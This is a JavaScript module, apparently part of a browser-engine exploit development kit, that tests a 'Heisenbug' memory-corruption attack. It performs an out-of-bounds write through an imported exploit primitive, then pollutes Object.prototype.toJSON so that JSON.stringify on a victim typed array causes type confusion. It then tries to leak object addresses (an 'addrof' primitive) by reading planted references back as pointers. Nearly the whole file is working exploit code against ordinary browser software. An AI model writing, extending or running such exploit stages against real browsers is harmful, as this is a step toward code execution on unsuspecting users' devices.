// js/script3/testArrayBufferVictimCrash.mjs (v33_LeakFromCapturedDetails)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD = "OriginalHeisenbug_TypedArrayAddrof_v33_LeakFromCapturedDetails";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v33 = null;
let object_to_leak_B_v33 = null;
let victim_typed_array_ref_v33 = null; 
let probe_call_count_v33 = 0;
let all_probe_interaction_details_v33 = []; 
const PROBE_CALL_LIMIT_V33 = 5; 


function toJSON_TA_Probe_LeakFromDetails() {
    probe_call_count_v33++;
    const call_num = probe_call_count_v33;
    // current_call_details descreve ESTA chamada da sonda.
    // Se esta chamada tiver 'this' confuso, current_call_details se tornará esse 'this' confuso.
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v33_LeakFromCapturedDetails",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v33),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_v33') && this.marker_v33 === (call_num - 1)),
        leaky_A_payload_assigned: false, // Renomeado para indicar que foi atribuído ao 'this'
        leaky_B_payload_assigned: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V33) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v33.push(current_call_details);
            return { recursion_stopped_v33: true, call: call_num };
        }

        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
            
            // 'this' é o current_call_details desta chamada. Atribuir os objetos de leak a ele.
            if (object_to_leak_A_v33) {
                this.leaky_A_payload_v33 = object_to_leak_A_v33; 
                current_call_details.leaky_A_payload_assigned = true; // Marcar que a propriedade foi definida neste objeto
            }
            if (object_to_leak_B_v33) {
                this.leaky_B_payload_v33 = object_to_leak_B_v33;
                current_call_details.leaky_B_payload_assigned = true;
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: leaky_A/B_payload_v33 assigned to 'this'. 'this' keys: ${Object.keys(this).join(',')}`, "info");
            
            all_probe_interaction_details_v33.push(this); // Adiciona o 'this' modificado (que é current_call_details)
            return this; // Retornar o 'this' confuso e modificado
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    all_probe_interaction_details_v33.push(current_call_details);
    return { marker_v33: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_LeakFromCapturedDetails() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (LeakFromCapturedDetails) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD} Init...`;

    probe_call_count_v33 = 0;
    all_probe_interaction_details_v33 = []; 
    victim_typed_array_ref_v33 = null; 
    object_to_leak_A_v33 = { marker_A_v33: "LeakMeA", idA: Date.now() }; 
    object_to_leak_B_v33 = { marker_B_v33: "LeakMeB", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_interest_from_probes = null; 
    
    let addrof_A = { success: false, msg: "Addrof A from details: Default" };
    let addrof_B = { success: false, msg: "Addrof B from details: Default" };
    // const fillPattern = 0.33333333333333; // Não precisamos preencher o buffer da vítima se não vamos checar

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v33 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        // let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v33.buffer); 
        // for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v33 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakFromDetails, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v33); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Encontrar o ÚLTIMO objeto de detalhes onde a type confusion ocorreu E as escritas foram tentadas
            for (let i = all_probe_interaction_details_v33.length - 1; i >= 0; i--) {
                const details = all_probe_interaction_details_v33[i];
                if (details.this_type === "[object Object]" && details.leaky_A_payload_assigned) {
                    details_of_interest_from_probes = JSON.parse(JSON.stringify(details)); // Deep copy
                    break;
                }
            }
            logS3(`  EXECUTE: Captured details of INTEREST from probes: ${details_of_interest_from_probes ? JSON.stringify(details_of_interest_from_probes) : 'N/A (No suitable probe call found)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedAndWritesDone = false;
            if (details_of_interest_from_probes && 
                details_of_interest_from_probes.this_type === "[object Object]" &&
                details_of_interest_from_probes.leaky_A_payload_assigned) { // Checa se as props foram atribuídas
                heisenbugConfirmedAndWritesDone = true;
                logS3(`  EXECUTE: HEISENBUG & WRITES CONFIRMED by details_of_interest_from_probes! 'this' type: ${details_of_interest_from_probes.this_type}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Details from that call (#${details_of_interest_from_probes.call_number}): IsVictim? ${details_of_interest_from_probes.this_is_victim}, IsPrevMarker? ${details_of_interest_from_probes.this_is_prev_marker}`, "info");
                logS3(`    Value of leaky_A_payload_v33 in captured details: ${details_of_interest_from_probes.leaky_A_payload_v33 ? JSON.stringify(details_of_interest_from_probes.leaky_A_payload_v33) : 'undefined/null'}`, "leak");
                logS3(`    Value of leaky_B_payload_v33 in captured details: ${details_of_interest_from_probes.leaky_B_payload_v33 ? JSON.stringify(details_of_interest_from_probes.leaky_B_payload_v33) : 'undefined/null'}`, "leak");

                // AGORA, VERIFICAR SE OS VALORES SÃO NÚMEROS QUE PARECEM PONTEIROS
                const val_A_obj = details_of_interest_from_probes.leaky_A_payload_v33;
                if (typeof val_A_obj === 'number' && val_A_obj !== 0) {
                    let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A_obj]).buffer)[0], new Uint32Array(new Float64Array([val_A_obj]).buffer)[1]);
                    if (num_int64.high() < 0x00020000 || (num_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                        addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA from details.leaky_A_payload_v33: ${num_int64.toString(true)}`;
                    } else { addrof_A.msg = `details.leaky_A_payload_v33 is num but not ptr: ${val_A_obj}`; }
                } else if (val_A_obj === object_to_leak_A_v33) { // Verificação de identidade (menos útil para addrof numérico)
                     addrof_A.msg = "details.leaky_A_payload_v33 is IDENTICAL to object_to_leak_A_v33 (object ref).";
                } else { addrof_A.msg = `details.leaky_A_payload_v33 not num or not ptr. Val: ${val_A_obj}`; }

                const val_B_obj = details_of_interest_from_probes.leaky_B_payload_v33;
                if (typeof val_B_obj === 'number' && val_B_obj !== 0) {
                     let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B_obj]).buffer)[0], new Uint32Array(new Float64Array([val_B_obj]).buffer)[1]);
                    if (num_int64.high() < 0x00020000 || (num_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                        addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB from details.leaky_B_payload_v33: ${num_int64.toString(true)}`;
                    } else { addrof_B.msg = `details.leaky_B_payload_v33 is num but not ptr: ${val_B_obj}`; }
                } else if (val_B_obj === object_to_leak_B_v33) {
                     addrof_B.msg = "details.leaky_B_payload_v33 is IDENTICAL to object_to_leak_B_v33 (object ref).";
                } else { addrof_B.msg = `details.leaky_B_payload_v33 not num or not ptr. Val: ${val_B_obj}`; }


            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug & Writes NOT confirmed by details_of_interest_from_probes. Last 'this' type: ${details_of_interest_from_probes ? details_of_interest_from_probes.this_type : 'N/A (no suitable probe call found)'}`, "error", FNAME_CURRENT_TEST);
            }
                
            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD}: AddrFromDetails SUCCESS!`;
            } else if (heisenbugConfirmedAndWritesDone) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V33_LFCD} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v33}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A from details: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B from details: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v33 = null; 
        all_probe_interaction_details_v33 = []; 
        probe_call_count_v33 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_interest_from_probes, // Retorna os detalhes da chamada de interesse
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v33],
        total_probe_calls: probe_call_count_v33,
        addrof_A_result: addrof_A, // Renomeado para clareza
        addrof_B_result: addrof_B  // Renomeado para clareza
    };
}
